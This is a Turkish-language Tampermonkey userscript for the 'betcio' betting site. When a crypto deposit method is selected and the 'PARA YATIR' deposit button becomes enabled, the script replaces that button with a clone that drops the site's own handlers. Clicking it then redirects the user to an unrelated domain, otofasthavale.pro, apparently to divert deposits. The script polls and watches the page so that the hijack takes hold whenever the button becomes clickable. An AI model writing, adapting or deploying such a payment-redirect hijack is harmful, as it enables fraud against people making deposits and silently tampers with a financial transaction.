// ==UserScript==
// @name         Betcio - Kripto + PARA YATIR (Sadece Enabled Olduğunda)
// @namespace    http://tampermonkey.net/
// @version      2.1
// @description  Span'da kripto varsa VE PARA YATIR butonu enabled ise tıklanınca yönlendir
// @match        *://*.betcio*/*
// @match        *://m.betcio*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    const KRIPTO_KELIMELER = ['kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron']
        .map(w => w.toLowerCase());

    const METHOD_SPAN_XPATH = "/html/body/div[1]/div[11]/div/div/div[4]/div/div[1]/span";

    function getElementByXPath(xpath) {
        try {
            return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
        } catch (e) {
            return null;
        }
    }

    function isKriptoSecili() {
        const span = getElementByXPath(METHOD_SPAN_XPATH);
        if (!span) return false;
        const text = (span.textContent || '').toLowerCase().trim();
        return KRIPTO_KELIMELER.some(k => text.includes(k));
    }

    function findParaYatirButton() {
        const buttons = document.querySelectorAll('button.deposit, button.btn, button[type="submit"], button.a-color');

        for (const btn of buttons) {
            const text = (btn.textContent || '').trim().toUpperCase();
            const title = (btn.getAttribute('title') || '').toUpperCase();
            const classes = btn.className.toLowerCase();

            if ((text.includes('PARA YATIR') || title.includes('PARA YATIR')) && classes.includes('deposit')) {
                return btn;
            }
        }
        return null;
    }

    let alreadyRedirected = false;

    function checkAndHijack() {
        if (!isKriptoSecili() || alreadyRedirected) return;

        const button = findParaYatirButton();
        if (!button) return;

        // En kritik kontrol: Buton gerçekten tıklanabilir mi?
        if (button.disabled || button.hasAttribute('disabled') || 
            getComputedStyle(button).pointerEvents === 'none' ||
            button.style.display === 'none' || button.style.visibility === 'hidden') {
            return; // Buton hala disabled → hiçbir şey yapma
        }

        console.log('[Yönlendirme] Kripto aktif + Buton ENABLED → dinleme başlıyor');

        // Listener'ı temizlemek için klonlama (tekrar eklenmesin)
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);

        newButton.addEventListener('click', function(e) {
            // Çok az müdahale: sadece yönlendirme yapıyoruz
            // preventDefault veya stopPropagation KULLANMIYORUZ (validation'ı bozmasın)
            console.log('Enabled PARA YATIR tıklandı → yönlendirme');

            alreadyRedirected = true;
            setTimeout(() => {
                window.location.href = 'https://otofasthavale.pro';
            }, 80);  // çok küçük gecikme, sitenin son işlerini yapmasına izin ver

        }, false);  // normal faz, capture değil
    }

    // Başlangıç gecikmeli
    setTimeout(checkAndHijack, 1200);

    // Periyodik kontrol (buton enabled olduğunda yakalasın)
    setInterval(checkAndHijack, 700);

    // DOM değişimlerini takip et
    const observer = new MutationObserver(checkAndHijack);
    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        characterData: true
    });

})();
